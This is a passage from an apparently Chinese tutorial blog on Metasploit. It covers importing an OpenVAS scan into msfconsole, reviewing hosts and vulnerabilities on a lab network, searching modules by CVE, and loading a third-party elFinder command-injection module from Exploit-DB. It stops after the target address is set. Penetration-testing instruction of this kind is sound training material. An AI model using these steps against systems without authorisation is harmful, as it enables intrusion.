Metasploit Zip Export</span><br><span class="line">    Microsoft Baseline Security Analyzer</span><br><span class="line">    NeXpose Simple XML</span><br><span class="line">    NeXpose XML Report</span><br><span class="line">    Nessus NBE Report</span><br><span class="line">    Nessus XML (v1)</span><br><span class="line">    Nessus XML (v2)</span><br><span class="line">    NetSparker XML</span><br><span class="line">    Nikto XML</span><br><span class="line">    Nmap XML</span><br><span class="line">    OpenVAS Report</span><br><span class="line">    OpenVAS XML</span><br><span class="line">    Outpost24 XML</span><br><span class="line">    Qualys Asset XML</span><br><span class="line">    Qualys Scan XML</span><br><span class="line">    Retina XML</span><br><span class="line">    Spiceworks CSV Export</span><br><span class="line">    Wapiti XML</span><br><span class="line"></span><br><span class="line">msf6 &gt;</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，支持导入的所有报告文件类型，如Nessus XML、Nmap XML和OpenVAS XML等。</p></li><li><p>导入扫描报告文件openvas.xml。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; db_import /tmp/openvas.xml</span><br><span class="line">[*] Importing <span class="string">'OpenVAS XML'</span> data</span><br><span class="line">[*] Import: Parsing with <span class="string">'Nokogiri v1.10.10'</span></span><br><span class="line">[*] Successfully imported /tmp/openvas.xml</span><br></pre></td></tr></table></figure><p>看到以上输出的信息，则表示成功导入了报告文件openvas.xml。</p></li><li><p>查看导入的主机。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; workspace -v</span><br><span class="line"></span><br><span class="line">Workspaces</span><br><span class="line">==========</span><br><span class="line"></span><br><span class="line">current  name     hosts  services  vulns  creds  loots  notes</span><br><span class="line">-------  ----     -----  --------  -----  -----  -----  -----</span><br><span class="line">         <span class="built_in">test</span>     0      0         0      0      0      0</span><br><span class="line">*        default  9      14        25     0      0      0</span><br></pre></td></tr></table></figure></li></ol><h2 id="二、查询渗透测试模块"><a href="#二、查询渗透测试模块" class="headerlink" title="二、查询渗透测试模块"></a>二、查询渗透测试模块</h2><p>漏洞利用主要是通过Metasploit的渗透测试模块来实现的。所以，用户需要根据漏洞查找对应的渗透测试模块。在Metasploit中，可以使用search命令快速查找渗透测试模块。用户还可以到一些第三方网站查找渗透测试模块，并导入Metasploit中实施漏洞利用。</p><h3 id="2-1-预分析扫描报告"><a href="#2-1-预分析扫描报告" class="headerlink" title="2.1 预分析扫描报告"></a>2.1 预分析扫描报告</h3><p>在前面用户已成功导入了扫描报告。此时，用户可以对该扫描报告进行分析，找出目标系统中的漏洞。然后，根据该漏洞查找可以利用该漏洞的渗透测试模块，并实施攻击。</p><p>预分析扫描报告。具体操作步骤如下：</p><ol><li><p>使用hosts命令查看报告的主机信息。执行命令如下：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; hosts</span><br><span class="line"></span><br><span class="line">Hosts</span><br><span class="line">=====</span><br><span class="line"></span><br><span class="line">address        mac  name  os_name  os_flavor  os_sp  purpose  info  comments</span><br><span class="line">-------        ---  ----  -------  ---------  -----  -------  ----  --------</span><br><span class="line"><span class="number">192.168</span><span class="number">.10</span><span class="number">.1</span>              Unknown                    device         </span><br><span class="line"><span class="number">192.168</span><span class="number">.10</span><span class="number">.3</span>              Unknown                    device         </span><br><span class="line"><span class="number">192.168</span><span class="number">.10</span><span class="number">.6</span>              Unknown                    device         </span><br><span class="line"><span class="number">192.168</span><span class="number">.10</span><span class="number">.9</span>              Unknown                    device         </span><br><span class="line"><span class="number">192.168</span><span class="number">.10</span><span class="number">.54</span>             Unknown                    device         </span><br><span class="line"><span class="number">192.168</span><span class="number">.10</span><span class="number">.55</span>             Unknown                    device         </span><br><span class="line"><span class="number">192.168</span><span class="number">.10</span><span class="number">.56</span>             Unknown                    device         </span><br><span class="line"><span class="number">192.168</span><span class="number">.10</span><span class="number">.73</span>             Unknown                    device         </span><br><span class="line"><span class="number">192.168</span><span class="number">.10</span><span class="number">.74</span>             Unknown                    device</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，该扫描报告中共有9台主机。</p></li><li><p>使用vulns命令查看漏洞信息。执行命令如下：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; vulns</span><br><span class="line"></span><br><span class="line">Vulnerabilities</span><br><span class="line">===============</span><br><span class="line"></span><br><span class="line">Timestamp                Host           Name                                                                     References</span><br><span class="line">---------                ----           ----                                                                     ----------</span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">42</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.1</span>   source_name                                                              </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">42</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.1</span>   SSL/TLS: Report Vulnerable Cipher Suites <span class="keyword">for</span> HTTPS                       </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.74</span>  SSL/TLS: Untrusted Certificate Authorities                               </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.6</span>   DCE/RPC <span class="keyword">and</span> MSRPC Services Enumeration Reporting                         </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.74</span>  SSL/TLS: Report Weak Cipher Suites                                       </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.3</span>   DCE/RPC <span class="keyword">and</span> MSRPC Services Enumeration Reporting                         </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.54</span>  Cleartext Transmission of Sensitive Information via HTTP                 </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.74</span>  Cleartext Transmission of Sensitive Information via HTTP                 </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.9</span>   Telnet Unencrypted Cleartext Login                                       </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.54</span>  FTP Unencrypted Cleartext Login                                          </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.1</span>   Telnet Unencrypted Cleartext Login                                       </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.55</span>  FTP Unencrypted Cleartext Login                                          </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.73</span>  SSH Weak Encryption Algorithms Supported                                 </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.74</span>  SSL/TLS: Deprecated SSLv2 <span class="keyword">and</span> SSLv3 Protocol Detection                   </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.9</span>   jQuery &lt; <span class="number">1.9</span><span class="number">.0</span> XSS Vulnerability                                         </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.74</span>  SSH Weak Encryption Algorithms Supported                                 </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.1</span>   SSL/TLS: Certificate Signed Using A Weak Signature Algorithm             </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.56</span>  TCP timestamps                                                           </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.73</span>  TCP timestamps                                                           </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.55</span>  TCP timestamps                                                           </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.1</span>   SSL/TLS: TLS/SPDY Protocol Information Disclosure Vulnerability (CRIME)  </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.74</span>  TCP timestamps                                                           </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.54</span>  TCP timestamps                                                           </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.9</span>   TCP timestamps                                                           </span><br><span class="line"><span class="number">2020</span><span class="number">-12</span><span class="number">-18</span> <span class="number">08</span>:<span class="number">48</span>:<span class="number">43</span> UTC  <span class="number">192.168</span><span class="number">.10</span><span class="number">.1</span>   TCP timestamps</span><br></pre></td></tr></table></figure><p>从输出的信息中，可以看到扫描报告中的详细漏洞信息。以上漏洞信息中共包括4列，分别表示Timestamp（时间戳）、Host（主机地址）、Name（漏洞名称）和References（参考信息）。接下来，用户可以根据漏洞名称（Name）或参考信息（References）搜索可使用的攻击载荷。</p></li></ol><h3 id="2-2-手动查找攻击载荷"><a href="#2-2-手动查找攻击载荷" class="headerlink" title="2.2 手动查找攻击载荷"></a>2.2 手动查找攻击载荷</h3><p>当用户确定目标系统中存在的漏洞后，可以在Metasploit中查找渗透测试模块，以选择可以利用其漏洞的渗透测试模块，进而实施渗透测试。这里介绍使用search命令手动查找渗透测试模块的方法。</p><p>查找渗透测试模块的语法格式如下：</p><blockquote><p>search [options]<keywords></keywords></p></blockquote><p>以上语句中，options表示支持的选项；keywords表示可使用的关键字。其中，支持的选项及含义如下：</p><blockquote><p>-h：显示帮助信息。<br>-o<file>：指定输出信息的保存文件，格式为CSV。<br>-S<string>：指定搜索的字符串。<br>-u：指定搜索模块。</string></file></p></blockquote><p>search命令支持的关键字及含义如下表所示。</p><table><thead><tr><th>关键字</th><th>描述</th></tr></thead><tbody><tr><td>aka</td><td>使用别名（Also Known As，AKA）搜索模块</td></tr><tr><td>author</td><td>通过作者搜索模块，如果author:dookie</td></tr><tr><td>arch</td><td>通过架构搜索模块</td></tr><tr><td>bid</td><td>通过Bugtraq ID搜索模块</td></tr><tr><td>cve</td><td>通过CVE ID搜索模块，如cve:2009</td></tr><tr><td>edb</td><td>通过Exploit-DB ID搜索模块</td></tr><tr><td>check</td><td>搜索支持check方法的模块</td></tr><tr><td>date</td><td>通过发布日期搜索模块</td></tr><tr><td>description</td><td>通过描述信息搜索模块</td></tr><tr><td>fullname</td><td>通过全名搜索模块</td></tr><tr><td>mod_time</td><td>通过修改日期搜索模块</td></tr><tr><td>name</td><td>通过描述名称搜索模块，如name:mysql</td></tr><tr><td>path</td><td>通过路径搜索模块</td></tr><tr><td>platform</td><td>通过运行平台搜索模块，如platform:aix</td></tr><tr><td>port</td><td>通过端口搜索模块</td></tr><tr><td>rank</td><td>通过漏洞严重级别搜索模块，如good。或者使用操作运算符，如gte400</td></tr><tr><td>ref</td><td>通过模块编号搜索模块</td></tr><tr><td>reference</td><td>通过参考信息搜索模块</td></tr><tr><td>target</td><td>通过目标搜索模块</td></tr><tr><td>type</td><td>搜索特定类型的模块（exploit、payload、auxiliary、encoder、evasion、post或nop），如type:exploit</td></tr></tbody></table><p>手动查找CVE漏洞为2019年的渗透测试模块。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search cve:2019</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#   Name                                                                    Disclosure Date  Rank       Check  Description</span></span><br><span class="line">   -   ----                                                                    ---------------  ----       -----  -----------</span><br><span class="line">   0   auxiliary/admin/http/supra_smart_cloud_tv_rfi                           2019-06-03       normal     No     Supra Smart Cloud TV Remote File Inclusion</span><br><span class="line">   1   auxiliary/admin/http/wp_google_maps_sqli                                2019-04-02       normal     Yes    WordPress Google Maps Plugin SQL Injection</span><br><span class="line">   2   auxiliary/admin/networking/cisco_dcnm_download                          2019-06-26       normal     No     Cisco Data Center Network Manager Unauthenticated File Download</span><br><span class="line">   3   auxiliary/dos/http/cable_haunt_websocket_dos                            2020-01-07       normal     No     <span class="string">"Cablehaunt"</span> Cable Modem WebSocket DoS</span><br><span class="line">   4   auxiliary/dos/http/metasploit_httphandler_dos                           2019-09-04       normal     No     Metasploit HTTP(S) handler DoS</span><br><span class="line">   5   auxiliary/dos/http/tautulli_shutdown_exec                                                normal     No     Tautulli v2.1.9 - Shutdown Denial of Service</span><br><span class="line">   6   auxiliary/gather/cisco_rv320_config                                     2019-01-24       normal     No     Cisco RV320/RV326 Configuration Disclosure</span><br><span class="line">   7   auxiliary/gather/ibm_bigfix_sites_packages_enum                         2019-03-18       normal     No     IBM BigFix Relay Server Sites and Package Enum</span><br><span class="line"></span><br><span class="line">	……/忽略部分内容/……</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，搜索到匹配发布日期为2019年的所有渗透测试模块。在输出的信息中共包括5列信息，分别表示Name（攻击载荷名称）、Disclosure Date（发布日期）、Rank（级别）、Check（是否支持漏洞检测）和Description（描述信息）。</p><p>查找漏洞名称为MS17-010 SMB RCE Detection的渗透测试模块。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; search name:MS17-010 SMB RCE Detection</span><br><span class="line"></span><br><span class="line">Matching Modules</span><br><span class="line">================</span><br><span class="line"></span><br><span class="line">   <span class="comment">#  Name                               Disclosure Date  Rank   Check  Description</span></span><br><span class="line">   -  ----                               ---------------  ----   -----  -----------</span><br><span class="line">   0  auxiliary/scanner/smb/smb_ms17_010                  normal No     MS17-010 SMB RCE Detection</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，找到了可利用MS17-010漏洞的所有渗透测试模块。此时，用户可以选择一个渗透测试模块来实施渗透测试。例如，选择名为auxiliary/scanner/smb/smb_ms17_010的渗透测试模块。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; auxiliary/scanner/smb/smb_ms17_010</span><br><span class="line">[-] Unknown <span class="built_in">command</span>: auxiliary/scanner/smb/smb_ms17_010.</span><br><span class="line">This is a module we can load. Do you want to use auxiliary/scanner/smb/smb_ms17_010? [y/N]   y</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_ms17_010) &gt;</span><br></pre></td></tr></table></figure><h3 id="2-3-第三方查找"><a href="#2-3-第三方查找" class="headerlink" title="2.3 第三方查找"></a>2.3 第三方查找</h3><p>如果用户在Metasploit中找不到有效的渗透测试模块时，还可以从第三方网站查找，如CVE漏洞站点和exploitDB等。另外，Metasploit还支持导入第三方模块，并实施渗透测试。</p><h4 id="2-3-1-通过CVE漏洞网站查找"><a href="#2-3-1-通过CVE漏洞网站查找" class="headerlink" title="2.3.1 通过CVE漏洞网站查找"></a>2.3.1 通过CVE漏洞网站查找</h4><p>CVE漏洞网站的地址为 <a href="https://www.cvedetails.com/" target="_blank" rel="noopener">https://www.cvedetails.com/</a> ，在浏览器中成功访问该网站后，将显示下如图所示的界面。</p><p><img src="/2020/12/23/kali-lou-dong-li-yong/%E5%9B%BE%E7%89%876.png" alt="图片6"></p><p>此时，用户在该站点页面可以通过CVE ID、产品名、生产厂商或漏洞类型来搜索渗透测试模块。例如，查询Microsoft相关的漏洞。在搜索框中输入Microsoft，单击Search按钮，然后选择搜索到的第一个结果，如下图所示。</p><p><img src="/2020/12/23/kali-lou-dong-li-yong/%E5%9B%BE%E7%89%877.png" alt="图片7"></p><p>从该界面可以看到搜索到的Microsoft相关统计信息。从统计结果中可以看到，共找到6814个漏洞。此时，选择Vulnerabilities(6814)选项，即可显示漏洞的详细信息，如下图所示。</p><p><img src="/2020/12/23/kali-lou-dong-li-yong/%E5%9B%BE%E7%89%878.png" alt="图片8"></p><p>从该界面可以看到所有的漏洞信息，包括CVE ID、漏洞类型、发布日期、更新日期及评分等。例如CVE IE为CVE-2019-11397的漏洞类型为Dir. Trav. File Inclusion，发布日期为2019-05-14，更新日期为2019-05-16等。</p><h4 id="2-3-2-通过exploitDB漏洞网站查找"><a href="#2-3-2-通过exploitDB漏洞网站查找" class="headerlink" title="2.3.2 通过exploitDB漏洞网站查找"></a>2.3.2 通过exploitDB漏洞网站查找</h4><p>exploitDB漏洞网站的地址为 <a href="https://www.exploit-db.com/" target="_blank" rel="noopener">https://www.exploit-db.com/</a> 。在浏览器中成功访问该网站后，将显示如下图所示的界面。</p><p><img src="/2020/12/23/kali-lou-dong-li-yong/%E5%9B%BE%E7%89%879.png" alt="图片9"></p><p>在该界面输入攻击载荷的一些关键字，即可搜索到对应的渗透测试模块。在搜索时，用户还可以选择Verified和Has App复选框，过滤已验证过和容易攻击的应用程序渗透测试模块。例如，搜索Windows系统的渗透测试模块。搜索成功后，将显示如下图所示的界面。</p><p><img src="/2020/12/23/kali-lou-dong-li-yong/%E5%9B%BE%E7%89%8710.png" alt="图片10"></p><p>从该界面可以看到搜索到的所有结果。在输出的信息中包括8列，分别表示Date（发布日期）、D（下载渗透攻击载荷）、A（可利用的应用程序）、V（已被验证）、Title（漏洞标题）、Type（类型）、Platform（平台）和Author（作者）。这里，用户可以选择下载及查看漏洞的详细信息。如果想要下载该渗透测试模块，则单击D列的下载按钮。如果想要想要查看该漏洞的详细信息，单击其漏洞标题名称即可。例如，查看该界面显示的第一个漏洞详细信息，结果如下图所示。</p><p><img src="/2020/12/23/kali-lou-dong-li-yong/%E5%9B%BE%E7%89%8711.png" alt="图片11"></p><p>从该界面的描述信息中，可以看到该漏洞的详细信息。另外，用户还可以从该网站下载一些渗透测试模块，并手动导入Metasploit中。</p><h4 id="2-3-3-手动导入第三方模块"><a href="#2-3-3-手动导入第三方模块" class="headerlink" title="2.3.3 手动导入第三方模块"></a>2.3.3 手动导入第三方模块</h4><p>Metasploit自带的模块已经很丰富了，但有时候也不能完全满足用户的需求。对于一些比较新的漏洞或者没有官方模块支持的漏洞，用户只能自己手动编写或者导入第三方模块。对于一般用户来说，通过直接导入第三方模块来使用更方便，而且也不容易出错。所以，下面将介绍手动导入第三方模块的方法。</p><p>导入从exploitDB网站下载的第三方模块，并使用该模块实施渗透测试。这里将以exiftran命令注入模块为例，并设置文件名为webtest.rb。具体操作步骤如下：</p><ol><li><p>将模块文件webtest.rb复制到Metasploit对应的模块位置。其中，Metasploit模块的默认位置为/root/.msf4/modules。为了方便区分模块，用户可以按照模块的分类创建对应的文件夹，用来保存不同类型的模块。本例中将导入一个渗透攻击模块，所以这里将创建名为exploits的文件夹。如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># mkdir /root/.msf4/modules/exploits</span></span><br></pre></td></tr></table></figure><p>执行以上命令后，将不会有任何信息输出。这里为了方便记忆或查找模块的位置，再创建一个test目录，然后将攻击载荷文件复制进去。如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> /root/.msf4/modules/exploits/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> mkdir <span class="built_in">test</span></span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">cd</span> <span class="built_in">test</span>/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> ls</span></span><br><span class="line">webtest.rb</span><br></pre></td></tr></table></figure><p>从输出的信息中可以看到，渗透攻击模块文件webtest.rb已被成功复制到新建的位置。</p></li><li><p>重新启动Metasploit工具，即可看到加载的渗透测试攻击模块。执行命令如下：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"># msfconsole </span><br><span class="line">                                                  </span><br><span class="line"></span><br><span class="line"> ______________________________________________________________________________</span><br><span class="line">|                                                                              |</span><br><span class="line">|                   METASPLOIT CYBER MISSILE COMMAND V5                        |</span><br><span class="line">|______________________________________________________________________________|</span><br><span class="line">      \                                  /                      /</span><br><span class="line">       \     .                          /                      /            x</span><br><span class="line">        \                              /                      /</span><br><span class="line">         \                            /          +           /</span><br><span class="line">          \            +             /                      /</span><br><span class="line">           *                        /                      /</span><br><span class="line">                                   /      .               /</span><br><span class="line">    X                             /                      /            X</span><br><span class="line">                                 /                     ###</span><br><span class="line">                                /                     # % #</span><br><span class="line">                               /                       ###</span><br><span class="line">                      .       /</span><br><span class="line">     .                       /      .            *           .</span><br><span class="line">                            /</span><br><span class="line">                           *</span><br><span class="line">                  +                       *</span><br><span class="line"></span><br><span class="line">                                       ^</span><br><span class="line">####      __     __     __          #######         __     __     __        ####</span><br><span class="line">####    /    \ /    \ /    \      ###########     /    \ /    \ /    \      ####</span><br><span class="line">################################################################################</span><br><span class="line">################################################################################</span><br><span class="line"># WAVE <span class="number">5</span> ######## SCORE <span class="number">31337</span> ################################## HIGH FFFFFFFF #</span><br><span class="line">################################################################################</span><br><span class="line">                                                           https:<span class="comment">//metasploit.com</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">       =[ metasploit v6<span class="number">.0</span><span class="number">.15</span>-dev                          ]</span><br><span class="line">+ -- --=[ <span class="number">2072</span> exploits - <span class="number">1123</span> auxiliary - <span class="number">352</span> post       ]</span><br><span class="line">+ -- --=[ <span class="number">592</span> payloads - <span class="number">45</span> encoders - <span class="number">10</span> nops            ]</span><br><span class="line">+ -- --=[ <span class="number">7</span> evasion                                       ]</span><br><span class="line"></span><br><span class="line">Metasploit tip: Enable HTTP request and response logging <span class="keyword">with</span> set HttpTrace true</span><br></pre></td></tr></table></figure><p>从以上显示的信息中，可以看到exploits类模块由原来的2071变为2072。由此可以说明，模块已被成功导入。</p></li><li><p>选择webtest模块，并查看模块的选项。执行命令如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">msf6 &gt; use exploit/<span class="built_in">test</span>/webtest                                 <span class="comment">#选择使用的模块</span></span><br><span class="line">msf6 exploit(<span class="built_in">test</span>/webtest) &gt; show options                       <span class="comment">#查看模块选项</span></span><br><span class="line">Module options (exploit/<span class="built_in">test</span>/webtest):</span><br><span class="line">   Name       Current Setting     Required     Description</span><br><span class="line">   ----       ---------------     --------     -----------</span><br><span class="line">   Proxies                           no    A proxy chain of format <span class="built_in">type</span>:host:port</span><br><span class="line">                                                                 [,<span class="built_in">type</span>:host:port][...]</span><br><span class="line">   RHOSTS                          yes      The target address range or CIDR identifier</span><br><span class="line">   RPORT           80                      yes      The target port (TCP)</span><br><span class="line">   SSL        <span class="literal">false</span>                   no       Negotiate SSL/TLS <span class="keyword">for</span> outgoing </span><br><span class="line">                                                                        connections</span><br><span class="line">   TARGETURI /elFinder         yes       The base path to elFinder</span><br><span class="line">   VHOST                          no        HTTP server virtual host</span><br><span class="line">Exploit target:</span><br><span class="line">   Id  Name</span><br><span class="line">   --  ----</span><br><span class="line">   0   Auto</span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，显示了webtest模块的所有选项。以上信息共包括4列，分别表示Name（选项名称）、Current Setting（当前设置）、Required（是否必须设置）和Description（描述）。从输出的信息可以看到，RHOSTS必须配置选项，但目前还没有设置。</p></li><li><p>设置RHOSTS选项。执行命令如下：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msf6 exploit(test/webtest) &gt; <span class="keyword">set</span> RHOSTS <span class="number">192.168</span><span class="number">.29</span><span class="number">.141</span></span><br><span class="line">RHOSTS =&gt; <span class="number">192.168</span><span class="number">.29</span><span class="number">.141</span></span><br></pre></td></tr></table></figure><p>从输出的信息可以看到，已设置目标主机地址为192.168.29.141。</p></li></ol><h2 id="三、实施攻击"><a href="#三、实施攻击" class="headerlink" 